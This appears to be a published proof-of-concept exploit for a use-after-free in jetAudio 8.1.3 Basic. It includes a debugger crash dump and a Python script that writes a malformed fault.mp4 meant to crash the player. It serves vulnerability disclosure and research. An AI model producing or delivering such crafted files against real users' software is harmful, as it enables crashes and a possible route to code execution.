@@ -1,0 +1,46 @@
+# Exploit Title     	: jetAudio 8.1.3 Basic Use-after-free (Corrupted mp4) Crash POC
+# Product				: jetAudio Basic
+# Date              	: 12.12.2014
+# Exploit Author    	: ITDefensor Vulnerability Research Team http://itdefensor.ru/
+# Software Link     	: http://www.jetaudio.com/download/
+# Vulnerable version	: 8.1.3 (Latest at the moment) and probably previous versions
+# Vendor Homepage   	: http://www.jetaudio.com/
+# Tested on         	: jetAudio 8.1.3 Basic installed on Windows 7 x64, Windows Server 2008, Windows 7 x86
+# CVE 					: unknown at the moment
+#============================================================================================
+# Open created POC file (fault.mp4) with jetAudio
+# Details
+# 	(6e74.6e20): Access violation - code c0000005 (first chance)
+#  First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+#JFDSPL!JPluginCreate+0x338f8:
+#0a1a7588 8b11            mov     edx,dword ptr [ecx]  ds:002b:050aacf8=????????
+#0:000:x86> kb
+#ChildEBP RetAddr  Args to Child              
+#WARNING: Stack unwind information not available. Following frames may be wrong.
+#0018feec 72512466 00000000 00000000 00000000 JFDSPL!JPluginCreate+0x338f8
+#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for JetAudio.exe - 
+#0018ff00 005961ba 00000000 f9b7337c 00000000 MSVCR90!exit+0x11
+#0018ff88 7558338a 7efde000 0018ffd4 771e9f72 JetAudio!CxIOFile::~CxIOFile+0x19414a
+#0018ff94 771e9f72 7efde000 765bba31 00000000 kernel32!BaseThreadInitThunk+0xe
+#0018ffd4 771e9f45 00596315 7efde000 00000000 ntdll32!__RtlUserThreadStart+0x70
+#0018ffec 00000000 00596315 7efde000 00000000 ntdll32!_RtlUserThreadStart+0x1b
+#0:000:x86> u 0a1a7588 
+#JFDSPL!JPluginCreate+0x338f8:
+#0a1a7588 8b11            mov     edx,dword ptr [ecx]
+#0a1a758a 8b420c          mov     eax,dword ptr [edx+0Ch]
+#0a1a758d 6a01            push    1
+#0a1a758f 6870ff1d0a      push    offset JFDSPL!CxIOFile::~CxIOFile+0x303e0 (0a1dff70)
+#0a1a7594 ffd0            call    eax
+#0a1a7596 6aff            push    0FFFFFFFFh
+#0a1a7598 6a00            push    0
+#0a1a759a 8d8e043d0000    lea     ecx,[esi+3D04h]
+#============================================================================================
+#!/usr/bin/python
+  
+pocdata=("\x00\x00\x00\xFA\x66\x74\x79\x70\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x00\x00\x00\x00\x6D\x70\x34\x32\x69\x73\x6F\x6D\x61\x76\x63\x31\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x34\x32\x6D\x70\x6D\x70\x34\x32\x00\x00")
+  
+mp4file = "fault.mp4"
+file = open(mp4file,"w")
+file.write(pocdata)
+file.close()
